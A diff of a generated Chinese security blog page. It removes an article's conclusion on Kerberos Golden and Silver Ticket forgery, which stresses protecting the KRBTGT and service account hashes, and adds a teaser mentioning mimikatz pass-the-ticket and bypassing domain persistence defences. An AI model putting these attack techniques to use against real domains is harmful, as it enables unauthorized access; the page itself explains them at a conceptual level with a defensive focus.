-<li>全面安全隐患排查</li>
-</ol>
-<hr>
-<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>Kerberos票据伪造攻击利用了协议设计的信任机制。Golden Ticket和Silver Ticket分别从KDC层和服务层突破认证体系。核心在于理解”信任根”的概念——TGT的信任根是KRBTGT哈希，ST的信任根是服务账户哈希。</p>
-<p>防御重心应放在保护这些关键密钥上，同时通过多层次安全监控和审计在攻击链各环节设置检测点。纵深防御策略（Defense in Depth）是应对票据伪造攻击的根本之道。</p>
-<hr>
-<p><strong>参考资料</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft - Kerberos Authentication Overview</a></li>
-<li><a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/">MIT Kerberos Documentation</a></li>
-<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">ADSecurity - Golden Ticket</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Benjamin Delpy - mimikatz</a></li>
-<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">SpecterOps - Kerberoasting Revisited</a></li>
-</ul>
-
+          <p>Kerberos 票据攻击——Golden Ticket/Silver Ticket 伪造、mimikatz 票据传递与域持久化防御绕过。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Intranet-Kerberos-tickets/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1069,7 +833,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1161,7 +925,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1253,7 +1017,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1345,7 +1109,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
